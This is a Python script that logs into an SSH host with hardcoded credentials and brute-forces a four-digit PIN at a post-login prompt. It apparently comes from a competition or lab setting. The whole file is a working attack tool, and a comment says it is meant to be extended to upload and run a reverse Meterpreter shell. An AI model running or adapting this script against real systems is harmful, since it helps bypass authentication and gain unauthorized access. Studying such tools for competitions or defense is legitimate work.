'''
This script SSHs to a host with known creds to brute for a prompt post auth.
It is currently setup to brute a 4 digit numerical pin.
'''

import paramiko
import sys
import socket


def print_command_output(raw):
    # Function to split command output received from paramiko printing each line on a new line.
    # Will be useful for parsing output as well
    # Decode and split the raw output.  Loop it and print it.
    for i in raw.decode().split('\n'):
        print(blue + i + end_color)
        # test to find a string in the output
        if 'src' in i:
            print(red + "BOOM" + end_color)


def ssh_command(ssh):
    # needs to be tweaked up to upload and execute the reverse meterpreter shell
    # Invoke a shell so we can run commands
    shell_out = ssh.invoke_shell()
    print(shell_out.recv(1024).decode())

    # define a command.  We need this so we can interact with stdin & stdout directly
    stdin, stdout, stderr = ssh.exec_command('')

    # loop the range of numbers
    for i in range(num):
        # format the int to have 4 digits always
        guess = '{0:04}'.format(i)
        print(green + 'Guessing {0}... '.format(guess) + end_color)
        # Send the guess
        stdin.write(guess + '\n')
        # get the response
        result = stdout.readline(1024)
        # If we see "Correct" we are done
        if 'Correct' in result:
            print(green + "Winner is {0}".format(guess) + end_color)
            ssh.close()
            quit()
        print(red + result + end_color)


def ssh_connect():
    suser = "cdc"
    skey = "cdc"

    try:
        s = paramiko.SSHClient()

        s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        print(green + 'Connecting to {0}'.format(host) + end_color)
        s.connect(hostname=host, username=suser, password=skey, timeout=5, banner_timeout=1)

        # if the connection is successful send to the run a command function

        ssh_command(s)

    except (paramiko.ssh_exception.NoValidConnectionsError, paramiko.ssh_exception.AuthenticationException, socket.error) as e:
        print(red + 'Connection Failed to {0}'.format(host) + end_color)
        print(e)


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('Usage: python3 ' + sys.argv[0] + ' host')
        sys.exit(0)

    # Declare some colors to use
    green = '\033[92m'
    yellow = '\033[93m'
    red = '\033[91m'
    blue = '\033[94m'
    end_color = '\033[0m'

    # Assign arguments to more meaningful variables
    host = sys.argv[1]

    # Pin to brute force range
    num = 10000

    ssh_connect()